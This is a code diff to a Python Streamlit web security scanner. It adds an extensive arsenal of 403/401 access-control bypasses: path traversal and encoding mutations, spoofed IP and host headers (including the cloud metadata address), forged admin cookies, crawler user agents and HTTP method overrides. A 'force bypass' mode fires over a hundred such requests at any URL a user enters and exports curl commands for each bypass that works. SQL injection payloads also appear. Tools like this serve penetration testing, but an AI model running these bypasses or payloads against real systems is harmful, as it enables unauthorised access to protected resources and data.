@@ -182,61 +182,253 @@ class RobotsParser:
 # ─── Real Bypass Techniques ───────────────────────────────────────────────────
 class BypassEngine:
     """
-    Focus on bypasses that actually work against real stacks:
-      - Header-based (X-Original-URL, X-Rewrite-URL, X-Forwarded-For)
-      - Trailing dot / space / slash
-      - Nginx alias / off-by-slash tricks
-      - Method override (HEAD, OPTIONS, ACL, PROPFIND)
-      - Case manipulation (only on case-insensitive servers like IIS)
-      - Unicode normalization (NFKC collapses)
-      - Double URL encoding of the slash separator
+    Comprehensive 403/401 bypass arsenal. Techniques categorized:
+      - Path mutations (trailing chars, encoding, extensions, traversal)
+      - Header injection (routing headers, IP spoofing, auth tricks)
+      - Method overrides (HTTP verbs not in ACL)
+      - User-Agent manipulation (crawler bots, empty, curl)
+      - Cookie / Origin / Referer tricks
+      - Port / scheme variants
+
+    References:
+      - PortSwigger Research: Practical Web Cache Poisoning
+      - Orange Tsai: Breaking Parser Logic
+      - CVE-2018-1160, CVE-2022-22965, CVE-2021-40438
+      - HackTricks 403/401 bypass section
     """
 
+    # ── Path mutations ─────────────────────────────────────────────────────
     @staticmethod
     def path_mutations(path: str) -> list[tuple[str, str]]:
         """Returns list of (technique, mutated_path). path starts with /."""
         p = path if path.startswith("/") else "/" + path
         clean = p.lstrip("/")
+        base = p.rstrip("/")
+
         muts = [
+            # ── Trailing characters ────────────────────────────────
             ("trailing_slash", p + "/"),
+            ("trailing_double_slash", p + "//"),
             ("trailing_dot", p + "."),
+            ("trailing_double_dot", p + ".."),
+            ("trailing_space", p + " "),
             ("trailing_space_encoded", p + "%20"),
+            ("trailing_tab", p + "%09"),
+            ("trailing_cr", p + "%0d"),
+            ("trailing_lf", p + "%0a"),
+            ("trailing_crlf", p + "%0d%0a"),
+            ("trailing_null", p + "%00"),
             ("trailing_semicolon", p + ";"),
             ("trailing_questionmark", p + "?"),
             ("trailing_hash", p + "#"),
+            ("trailing_ampersand", p + "&"),
+            ("trailing_backslash", p + "%5c"),
+            ("trailing_pipe", p + "%7c"),
+            ("trailing_asterisk", p + "*"),
+
+            # ── Prefix tricks ──────────────────────────────────────
             ("double_slash_prefix", "//" + clean),
+            ("triple_slash_prefix", "///" + clean),
             ("dot_slash_prefix", "/./" + clean),
+            ("dot_dot_slash_prefix", "/../" + clean),
+            ("semicolon_prefix", "/;/" + clean),
+            ("encoded_dot_prefix", "/%2e/" + clean),
+            ("encoded_slash_prefix", "/%2f" + clean),
+
+            # ── Extension append ───────────────────────────────────
+            ("ext_json", base + ".json"),
+            ("ext_xml", base + ".xml"),
+            ("ext_html", base + ".html"),
+            ("ext_php", base + ".php"),
+            ("ext_asp", base + ".asp"),
+            ("ext_aspx", base + ".aspx"),
+            ("ext_jsp", base + ".jsp"),
+            ("ext_js", base + ".js"),
+            ("ext_css", base + ".css"),
+            ("ext_png", base + ".png"),
+            ("ext_jpg_null", base + ".jpg%00"),
+            ("ext_json_null", base + ".json%00"),
+
+            # ── Path traversal / off-by-slash ─────────────────────
+            ("nginx_offbyslash", base + "../"),
+            ("dot_dot_traversal", base + "/.."),
+            ("dot_dot_semicolon", base + "/..;/"),
+            ("double_encoded_traversal", base + "/%252e%252e/"),
+            ("apache_trailing_dot_segment", base + "/."),
+            ("tomcat_semicolon_segment", base + "/..;/" + clean),
+
+            # ── Case manipulation (IIS, some Java servers) ─────────
             ("case_upper", "/" + clean.upper()),
             ("case_lower", "/" + clean.lower()),
-            ("encoded_slash", "/" + urllib.parse.quote(clean, safe="")),
-            ("double_encoded_slash", "/" + urllib.parse.quote(urllib.parse.quote(clean, safe=""), safe="")),
-            ("nginx_offbyslash", p.rstrip("/") + "../"),
-            ("path_param_injection", p + ";foo=bar"),
-            ("utf8_overlong", "/" + clean.replace("/", "%c0%af")),
+            ("case_title", "/" + clean.title()),
+            ("case_alternating",
+             "/" + "".join(c.upper() if i % 2 == 0 else c.lower()
+                           for i, c in enumerate(clean))),
+            ("case_first_upper", "/" + (clean[0].upper() + clean[1:] if clean else "")),
+
+            # ── URL encoding variants ─────────────────────────────
+            ("single_url_encode", "/" + urllib.parse.quote(clean, safe="")),
+            ("double_url_encode",
+             "/" + urllib.parse.quote(urllib.parse.quote(clean, safe=""), safe="")),
+            ("triple_url_encode",
+             "/" + urllib.parse.quote(urllib.parse.quote(
+                 urllib.parse.quote(clean, safe=""), safe=""), safe="")),
+            ("utf8_overlong_slash", "/" + clean.replace("/", "%c0%af")),
+            ("utf8_overlong_dot", "/" + clean.replace(".", "%c0%ae")),
+            ("utf16_slash", "/" + clean.replace("/", "%u2215")),
+            ("uppercase_hex_encode",
+             "/" + "".join(f"%{ord(c):02X}" for c in clean)),
+            ("lowercase_hex_encode",
+             "/" + "".join(f"%{ord(c):02x}" for c in clean)),
+
+            # ── Path parameter injection ──────────────────────────
+            ("path_param_semicolon", p + ";foo=bar"),
+            ("path_param_session", p + ";jsessionid=abc"),
+            ("path_param_phpsessid", p + ";PHPSESSID=abc"),
+            ("matrix_param", p.replace("/", "/;x=y/", 1)),
+
+            # ── Query string tricks ───────────────────────────────
+            ("query_injection", p + "?admin=true"),
+            ("query_debug", p + "?debug=1"),
+            ("query_real_ip", p + "?X-Forwarded-For=127.0.0.1"),
+            ("fragment_injection", p + "#/admin"),
+            ("backtick_query", p + "?`"),
+
+            # ── Host / @ injection (URL parser confusion) ─────────
+            # These mutate the path side, host-level tricks in header_bypasses
+            ("at_sign_prefix", "/@" + clean),
+
+            # ── Middleware confusion (Next.js, Express, etc.) ─────
+            ("next_app_prefix", "/_next/" + clean),
+            ("api_prefix", "/api/" + clean),
+            ("static_prefix", "/static/../" + clean),
         ]
         return muts
 
+    # ── Header bypasses ────────────────────────────────────────────────────
     @staticmethod
     def header_bypasses(path: str) -> list[tuple[str, dict]]:
-        """Headers that some reverse proxies / frameworks honor for internal routing."""
+        """Headers that reverse proxies, frameworks, or ACLs sometimes honor."""
         p = path if path.startswith("/") else "/" + path
+        origin = "https://localhost"
         return [
+            # ── URL-rewriting headers ──────────────────────────────
             ("X-Original-URL", {"X-Original-URL": p}),
             ("X-Rewrite-URL", {"X-Rewrite-URL": p}),
             ("X-Override-URL", {"X-Override-URL": p}),
-            ("X-Forwarded-For", {"X-Forwarded-For": "127.0.0.1"}),
+            ("X-HTTP-Method-Override-GET", {"X-HTTP-Method-Override": "GET"}),
+            ("X-Forwarded-URI", {"X-Forwarded-URI": p}),
+            ("Request-URI", {"Request-URI": p}),
+
+            # ── IP spoofing ────────────────────────────────────────
+            ("X-Forwarded-For_localhost", {"X-Forwarded-For": "127.0.0.1"}),
+            ("X-Forwarded-For_internal", {"X-Forwarded-For": "192.168.0.1"}),
+            ("X-Forwarded-For_aws", {"X-Forwarded-For": "169.254.169.254"}),
             ("X-Real-IP", {"X-Real-IP": "127.0.0.1"}),
-            ("X-Forwarded-Host", {"X-Forwarded-Host": "localhost"}),
-            ("X-Host", {"X-Host": "localhost"}),
-            ("Referer_same_origin", {"Referer": "/"}),
             ("Client-IP", {"Client-IP": "127.0.0.1"}),
             ("True-Client-IP", {"True-Client-IP": "127.0.0.1"}),
+            ("Cluster-Client-IP", {"Cluster-Client-IP": "127.0.0.1"}),
+            ("X-Cluster-Client-IP", {"X-Cluster-Client-IP": "127.0.0.1"}),
+            ("CF-Connecting-IP", {"CF-Connecting-IP": "127.0.0.1"}),
+            ("Fastly-Client-IP", {"Fastly-Client-IP": "127.0.0.1"}),
+            ("X-Originating-IP", {"X-Originating-IP": "127.0.0.1"}),
+            ("X-Remote-IP", {"X-Remote-IP": "127.0.0.1"}),
+            ("X-Remote-Addr", {"X-Remote-Addr": "127.0.0.1"}),
+            ("Forwarded_rfc7239", {"Forwarded": "for=127.0.0.1;proto=https"}),
+
+            # ── Host spoofing ──────────────────────────────────────
+            ("X-Forwarded-Host_localhost", {"X-Forwarded-Host": "localhost"}),
+            ("X-Forwarded-Host_internal", {"X-Forwarded-Host": "internal.local"}),
+            ("X-Host", {"X-Host": "localhost"}),
+            ("X-Forwarded-Server", {"X-Forwarded-Server": "localhost"}),
+
+            # ── Scheme / proto tricks ──────────────────────────────
+            ("X-Forwarded-Proto_https", {"X-Forwarded-Proto": "https"}),
+            ("X-Forwarded-Scheme_https", {"X-Forwarded-Scheme": "https"}),
+            ("Front-End-Https", {"Front-End-Https": "on"}),
+
+            # ── Referer-based ACL bypass ───────────────────────────
+            ("Referer_root", {"Referer": "/"}),
+            ("Referer_admin", {"Referer": f"{origin}/admin"}),
+            ("Referer_self", {"Referer": f"{origin}{p}"}),
+            ("Origin_localhost", {"Origin": "http://localhost"}),
+            ("Origin_null", {"Origin": "null"}),
+
+            # ── User-Agent tricks ──────────────────────────────────
+            ("UA_Googlebot", {"User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"}),
+            ("UA_Bingbot", {"User-Agent": "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"}),
+            ("UA_empty", {"User-Agent": ""}),
+            ("UA_curl", {"User-Agent": "curl/7.88.0"}),
+            ("UA_internal", {"User-Agent": "internal-monitor/1.0"}),
+
+            # ── Auth / session tricks ──────────────────────────────
+            ("Authorization_empty", {"Authorization": ""}),
+            ("Authorization_null", {"Authorization": "Bearer null"}),
+            ("Cookie_admin_true", {"Cookie": "admin=true; is_admin=1; role=admin"}),
+            ("Cookie_debug", {"Cookie": "debug=true; env=dev"}),
+
+            # ── Content type / accept tricks ───────────────────────
+            ("Accept_json", {"Accept": "application/json"}),
+            ("Accept_xml", {"Accept": "application/xml"}),
+            ("Content-Type_text", {"Content-Type": "text/plain"}),
+
+            # ── Combo payloads (often hit together in prod) ────────
+            ("combo_localhost_full", {
+                "X-Forwarded-For": "127.0.0.1",
+                "X-Real-IP": "127.0.0.1",
+                "X-Forwarded-Host": "localhost",
+                "X-Original-URL": p,
+            }),
+            ("combo_googlebot_local", {
+                "User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1)",
+                "X-Forwarded-For": "127.0.0.1",
+            }),
         ]
 
+    # ── Method bypasses ────────────────────────────────────────────────────
     @staticmethod
     def method_bypasses() -> list[str]:
-        """HTTP methods sometimes not covered by ACLs (classic on Tomcat, old Apache)."""
-        return ["GET", "POST", "HEAD", "OPTIONS", "TRACE", "ACL", "PROPFIND", "PURGE"]
+        """HTTP methods not always covered by ACLs. Classic on Tomcat, old Apache, Spring."""
+        return [
+            "GET", "POST", "PUT", "DELETE", "PATCH",
+            "HEAD", "OPTIONS", "TRACE", "CONNECT",
+            "ACL", "PROPFIND", "PROPPATCH", "MKCOL", "MOVE", "COPY", "LOCK", "UNLOCK",
+            "PURGE", "VIEW", "DEBUG", "TRACK", "SEARCH",
+            # Nonstandard but sometimes work
+            "BREW", "WHEN", "X-GET",
+        ]
+
+    # ── Port / scheme variants (best-effort: same host, diff port) ─────────
+    @staticmethod
+    def port_variants(parsed_origin: str, path: str) -> list[tuple[str, str]]:
+        """Generate URLs with alternate ports/schemes to hit internal interfaces."""
+        parsed = urlparse(parsed_origin)
+        host = parsed.hostname or ""
+        p = path if path.startswith("/") else "/" + path
+        out = []
+        for scheme in ("http", "https"):
+            for port in ("", ":80", ":443", ":8080", ":8443", ":8000", ":3000", ":5000"):
+                if scheme == "https" and port in (":80", ":8080", ":8000"):
+                    continue
+                if scheme == "http" and port in (":443", ":8443"):
+                    continue
+                url = f"{scheme}://{host}{port}{p}"
+                if url != f"{parsed_origin.rstrip('/')}{p}":
+                    out.append((f"{scheme}{port or ':default'}", url))
+        return out
+
+    # ── Curl command export ───────────────────────────────────────────────
+    @staticmethod
+    def to_curl(url: str, method: str = "GET", headers: dict = None) -> str:
+        """Generate a copy-pasteable curl command for a successful bypass."""
+        parts = ["curl", "-sk", "-i"]
+        if method != "GET":
+            parts.extend(["-X", method])
+        if headers:
+            for k, v in headers.items():
+                parts.extend(["-H", f"'{k}: {v}'"])
+        parts.append(f"'{url}'")
+        return " ".join(parts)
 
 
 # ─── AI Analyzer (OpenRouter) ─────────────────────────────────────────────────
@@ -601,6 +793,101 @@ class SecurityScanner:
                     progress_cb((i + 1) / total)
         return found
 
+    # ── force bypass a single URL (hammer mode) ────────────────────────────
+    def force_bypass_url(self, target_url: str, progress_cb=None) -> dict:
+        """
+        Throw every bypass technique at a single URL. Returns a detailed
+        report including curl commands for any technique that worked.
+        """
+        parsed = urlparse(target_url)
+        path = parsed.path or "/"
+        origin = f"{parsed.scheme}://{parsed.netloc}"
+
+        # Baseline
+        baseline = http_request(target_url, timeout=self.timeout)
+        baseline_status = baseline.status_code if baseline else None
+        baseline_size = len(baseline.content) if baseline else 0
+
+        # Build full task matrix
+        tasks = []
+
+        # 1. Path mutations (all GET on origin + mutated path)
+        for technique, mutated in self.bypass.path_mutations(path):
+            url = f"{origin}{mutated if mutated.startswith('/') else '/' + mutated}"
+            tasks.append(("path_mutation", technique, url, "GET", {}))
+
+        # 2. Header bypasses (GET on original URL with injected headers)
+        for technique, headers in self.bypass.header_bypasses(path):
+            tasks.append(("header_bypass", technique, target_url, "GET", headers))
+            # Also try combined with base path
+            tasks.append(("header_bypass_root", technique, f"{origin}/", "GET", headers))
+
+        # 3. Method bypasses
+        for method in self.bypass.method_bypasses():
+            if method == "GET":
+                continue
+            tasks.append(("method_bypass", method, target_url, method, {}))
+
+        # 4. Port / scheme variants
+        for technique, url in self.bypass.port_variants(origin, path):
+            tasks.append(("port_variant", technique, url, "GET", {}))
+
+        total = len(tasks)
+        successes = []
+        all_attempts = []
+
+        def execute(kind, tech, url, method, headers):
+            resp = http_request(url, method=method, extra_headers=headers,
+                                timeout=self.timeout)
+            if not resp:
+                return None
+            attempt = {
+                "kind": kind,
+                "technique": tech,
+                "method": method,
+                "url": url,
+                "headers": headers,
+                "status": resp.status_code,
+                "size": len(resp.content),
+            }
+            # Success criteria: baseline was blocked (401/403/404/405)
+            # and this attempt returned 2xx or a significantly different-sized response
+            is_success = False
+            if resp.status_code in (200, 201, 202, 204, 301, 302):
+                if baseline_status in (401, 403, 404, 405, None):
+                    is_success = True
+                elif baseline_size and abs(len(resp.content) - baseline_size) / max(baseline_size, 1) > 0.3:
+                    is_success = True
+            if is_success:
+                attempt["evidence"] = self._analyze_response(resp)
+                attempt["curl"] = self.bypass.to_curl(url, method, headers)
+            return attempt, is_success
+
+        with ThreadPoolExecutor(max_workers=self.workers) as pool:
+            futures = {
+                pool.submit(execute, kind, tech, url, method, headers): (kind, tech)
+                for kind, tech, url, method, headers in tasks
+            }
+            for i, fut in enumerate(as_completed(futures)):
+                result = fut.result()
+                if result:
+                    attempt, is_success = result
+                    all_attempts.append(attempt)
+                    if is_success:
+                        successes.append(attempt)
+                if progress_cb:
+                    progress_cb((i + 1) / total)
+
+        return {
+            "target": target_url,
+            "baseline_status": baseline_status,
+            "baseline_size": baseline_size,
+            "total_attempts": total,
+            "successful_count": len(successes),
+            "successes": successes,
+            "all_attempts": all_attempts,
+        }
+
     # ── parameter injection (restored) ─────────────────────────────────────
     PAYLOADS = {
         "sqli": ["' OR '1'='1", "1' UNION SELECT NULL--", "1 AND 1=1--", "' OR 1=1#"],
@@ -720,6 +1007,7 @@ _DEFAULTS = {
     "hidden_files": [],
     "injections": [],
     "endpoints": [],
+    "force_bypass_results": {},
     "ai_triage": "",
     "ai_reports": {},
     "ai_bypass_suggestions": {},
@@ -747,6 +1035,17 @@ with st.sidebar:
     enable_injection = st.checkbox("Parameter Injection", value=False)
     enable_endpoints = st.checkbox("Sitemap/Endpoint Probe", value=True)
 
+    st.divider()
+    st.markdown("### 🔓 Force Bypass (Single URL)")
+    enable_force_bypass = st.checkbox("Hammer a single URL with all techniques", value=False)
+    force_url = st.text_input(
+        "URL returning 403/401",
+        placeholder="https://target.com/admin",
+        disabled=not enable_force_bypass,
+        help="Fires 100+ bypass techniques at this exact URL",
+    )
+
+    st.divider()
     test_param = st.text_input("Injection parameter", value="id")
     timeout_val = st.slider("Request timeout (s)", 3, 30, 10)
     workers_val = st.slider("Concurrent workers", 1, 30, 10)
@@ -824,7 +1123,8 @@ if start_btn:
         prog = st.progress(0.0)
         msg = st.empty()
 
-        modules = [enable_robots_bypass, enable_hidden_files, enable_injection, enable_endpoints]
+        modules = [enable_robots_bypass, enable_hidden_files, enable_injection,
+                   enable_endpoints, enable_force_bypass]
         total_modules = max(sum(modules), 1)
         base = 0.0
 
@@ -855,6 +1155,17 @@ if start_btn:
             st.session_state["endpoints"] = scanner.scan_endpoints(
                 lambda p: prog.progress(min(base + p / total_modules, 1.0))
             )
+            base += 1 / total_modules
+
+        if enable_force_bypass:
+            if not force_url or not force_url.startswith(("http://", "https://")):
+                st.warning("Force Bypass skipped — enter a valid URL")
+            else:
+                msg.info(f"🔓 Hammering {force_url} with full bypass arsenal…")
+                st.session_state["force_bypass_results"] = scanner.force_bypass_url(
+                    force_url,
+                    lambda p: prog.progress(min(base + p / total_modules, 1.0)),
+                )
 
         prog.progress(1.0)
         msg.success("✅ Scan complete")
@@ -898,6 +1209,7 @@ if st.session_state["scan_done"]:
     if enable_hidden_files:  tab_labels.append("📁 Hidden Files")
     if enable_injection:     tab_labels.append("💉 Injections")
     if enable_endpoints:     tab_labels.append("🔗 Endpoints")
+    if enable_force_bypass:  tab_labels.append("🔓 Force Bypass")
     if ai_enabled:           tab_labels.append("🧠 AI Analysis")
     tab_labels.append("📄 Report")
     tabs = st.tabs(tab_labels)
@@ -978,6 +1290,77 @@ if st.session_state["scan_done"]:
                     st.markdown(f'<div class="mono-block">{item["url"]}</div>', unsafe_allow_html=True)
                     for e in item.get("evidence", []):
                         st.markdown(f"- {e}")
+        idx += 1
+
+    # ── Force Bypass tab ───────────────────────────────────────────────────
+    if enable_force_bypass:
+        with tabs[idx]:
+            st.subheader("🔓 Force Bypass — Single URL Hammer")
+            fb = st.session_state.get("force_bypass_results", {})
+
+            if not fb:
+                st.info("No results yet — enable and run scan with a valid URL.")
+            else:
+                st.markdown(f"**Target:** `{fb.get('target', '?')}`")
+                col1, col2, col3, col4 = st.columns(4)
+                col1.metric("Baseline", fb.get("baseline_status", "?"))
+                col2.metric("Attempts", fb.get("total_attempts", 0))
+                col3.metric("Successes", fb.get("successful_count", 0),
+                            delta="🎯" if fb.get("successful_count", 0) else None)
+                col4.metric("Baseline size", f"{fb.get('baseline_size', 0)}B")
+
+                successes = fb.get("successes", [])
+                if successes:
+                    st.success(f"🎯 **{len(successes)} bypass techniques worked**")
+
+                    # Group by kind
+                    by_kind: dict[str, list] = {}
+                    for s in successes:
+                        by_kind.setdefault(s["kind"], []).append(s)
+
+                    for kind, items in by_kind.items():
+                        st.markdown(f"### {kind.replace('_', ' ').title()} ({len(items)})")
+                        for s in items:
+                            with st.expander(f"✅ {s['technique']} [{s['status']}] — {s['method']}"):
+                                st.markdown(f'<div class="mono-block">{s["url"]}</div>',
+                                            unsafe_allow_html=True)
+                                if s.get("headers"):
+                                    st.markdown("**Headers:**")
+                                    st.code(json.dumps(s["headers"], indent=2), language="json")
+                                st.markdown(f"**Size:** {s['size']} bytes (baseline was {fb.get('baseline_size', 0)})")
+                                if s.get("evidence"):
+                                    st.markdown("**Evidence:**")
+                                    for e in s["evidence"]:
+                                        st.markdown(f"- {e}")
+                                st.markdown("**Reproduce with curl:**")
+                                st.code(s["curl"], language="bash")
+
+                    # Bulk curl export
+                    all_curls = "\n\n".join(
+                        f"# {s['kind']} / {s['technique']} (HTTP {s['status']})\n{s['curl']}"
+                        for s in successes
+                    )
+                    st.download_button(
+                        "📥 Download all curl commands",
+                        data=all_curls,
+                        file_name=f"bypass_curls_{int(time.time())}.sh",
+                        mime="text/plain",
+                    )
+                else:
+                    st.warning("No bypasses worked on this URL. Try the AI Bypass Suggester tab.")
+
+                # Optional: show all attempts with filter
+                with st.expander(f"🔍 View all {len(fb.get('all_attempts', []))} attempts"):
+                    filter_status = st.multiselect(
+                        "Filter by status",
+                        options=sorted({a["status"] for a in fb.get("all_attempts", [])}),
+                        default=[],
+                    )
+                    attempts = fb.get("all_attempts", [])
+                    if filter_status:
+                        attempts = [a for a in attempts if a["status"] in filter_status]
+                    for a in attempts[:200]:
+                        st.markdown(f"- `[{a['status']}]` **{a['kind']}** / {a['technique']} ({a['method']}) → `{a['url'][:100]}`")
         idx += 1
 
     # ── AI Analysis tab ────────────────────────────────────────────────────
@@ -1128,6 +1511,7 @@ if st.session_state["scan_done"]:
             "hidden_files": hf,
             "injections": inj,
             "endpoints": ep,
+            "force_bypass": st.session_state.get("force_bypass_results", {}),
             "ai": {
                 "enabled": ai_enabled,
                 "model": ai_model if ai_enabled else None,
